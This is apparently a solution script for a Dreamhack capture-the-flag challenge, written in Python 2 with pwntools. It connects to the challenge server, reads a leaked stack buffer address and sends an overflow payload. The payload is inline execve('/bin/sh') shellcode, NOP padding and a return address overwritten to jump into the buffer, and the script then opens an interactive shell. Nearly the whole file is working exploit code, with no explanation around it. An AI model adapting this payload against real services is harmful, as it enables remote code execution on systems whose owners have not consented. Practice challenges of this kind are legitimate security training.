from pwn import *
# -*- coding: utf-8 -*-

#p = process('./basic_exploitation_000')
#gdb.attach(p,gdb_args=['-q','-ex init-pwngdb'])
p = remote('host1.dreamhack.games',18649)

context.clear()
context.update(arch='i386', os='linux')
context.log_level = 'debug'

binsh = asm(shellcraft.execve('/bin/sh'))
print p.recvuntil('buf = (')
buf = p.recvuntil(')\n').strip(')\n')
print int(buf,16)," == ",hex(int(buf,16))

#p.sendline("A"*128+"B"*4+"C"*4)
payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x04\x03\xcd\x80'
payload += "\x90"*(128-len(payload))
payload += "\x90"*4
payload += p32(int(buf,16))

p.sendline(payload)

p.interactive()


p.interactive()
